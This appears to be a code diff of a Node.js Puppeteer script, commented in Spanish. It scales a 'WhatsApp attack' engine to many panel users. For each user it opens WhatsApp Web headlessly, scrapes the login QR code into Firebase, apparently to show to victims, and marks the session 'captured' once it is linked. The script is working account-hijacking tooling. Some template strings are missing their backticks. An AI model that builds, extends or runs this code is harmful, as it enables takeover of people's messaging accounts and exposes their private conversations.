@@ -2,8 +2,7 @@ const puppeteer = require('puppeteer');
 const admin = require('firebase-admin');
 const http = require('http');
 
-// 1. CONFIGURACIÓN DE FIREBASE
-const serviceAccount = require("./serviceAccountKey.json"); 
+const serviceAccount = require("./serviceAccountKey.json");
 
 if (!admin.apps.length) {
     admin.initializeApp({
@@ -11,27 +10,40 @@ if (!admin.apps.length) {
     });
 }
 const db = admin.firestore();
-const adminUID = "AQUÍ_PEGA_TU_UID_REAL"; // <--- ASEGÚRATE DE PONER TU UID REAL
 
-async function startWA() {
-    // CORRECCIÓN DE SINTAXIS AQUÍ
-    console.log([*] Iniciando motor para UID: ${adminUID});
-    
+// MAPA PARA CONTROLAR MÚLTIPLES NAVEGADORES
+const sesionesActivas = new Map();
+
+async function iniciarMotorMultiusuario() {
+    console.log("[*] Buscando usuarios con ataque de WhatsApp activo...");
+
+    // Escuchamos la colección panelUsers buscando quién tiene 'wa_active: true'
+    // O simplemente escuchamos a todos los usuarios registrados
+    db.collection("panelUsers").onSnapshot(async (snap) => {
+        snap.forEach(async (doc) => {
+            const userId = doc.id;
+            const userData = doc.data();
+
+            // Solo iniciamos el motor si el usuario NO tiene ya uno corriendo
+            if (!sesionesActivas.has(userId)) {
+                console.log([+] Iniciando robot para usuario: ${userId});
+                lanzarNavegadorParaUsuario(userId);
+            }
+        });
+    });
+}
+
+async function lanzarNavegadorParaUsuario(uid) {
     try {
         const browser = await puppeteer.launch({
             headless: "new",
-            args: [
-                '--no-sandbox', 
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--single-process'
-            ]
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
         });
         
+        sesionesActivas.set(uid, browser);
         const page = await browser.newPage();
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
         
-        console.log("[*] Navegador abierto, cargando WhatsApp Web...");
         await page.goto('https://web.whatsapp.com', { waitUntil: 'networkidle2', timeout: 0 });
 
         setInterval(async () => {
@@ -44,36 +56,32 @@ async function startWA() {
                     });
 
                     if (qrData) {
-                        await db.collection("whatsapp_sessions").doc(adminUID).set({
+                        // Guardamos el QR en la carpeta de ese usuario específico
+                        await db.collection("whatsapp_sessions").doc(uid).set({
                             qrCode: qrData,
                             status: "esperando",
                             lastUpdate: admin.firestore.FieldValue.serverTimestamp()
                         }, { merge: true });
-                        console.log("QR Sincronizado.");
                     }
                 }
 
                 const loggedIn = await page.$('header span[data-icon="chat"]');
                 if (loggedIn) {
-                    await db.collection("whatsapp_sessions").doc(adminUID).update({ status: "exito" });
-                    console.log("¡Sesión capturada!");
+                    await db.collection("whatsapp_sessions").doc(uid).update({ status: "exito" });
                 }
-            } catch (e) {
-                // Silencioso para no saturar logs
-            }
-        }, 12000); // Cada 12 segundos para ahorrar memoria
+            } catch (e) { }
+        }, 15000);
 
     } catch (err) {
-        console.error("Error al iniciar Puppeteer:", err);
+        console.error(Error en robot de ${uid}:, err);
     }
 }
 
-// --- SERVIDOR PARA EVITAR EL TIMEOUT DE RENDER ---
+// SERVIDOR DE SALUD PARA RENDER
 const port = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('MOTOR WA ONLINE\n');
+    res.end('SISTEMA MULTI-USUARIO ONLINE\n');
 }).listen(port, () => {
-    console.log(Servidor de salud activo en puerto ${port});
-    startWA(); 
+    iniciarMotorMultiusuario();
 });
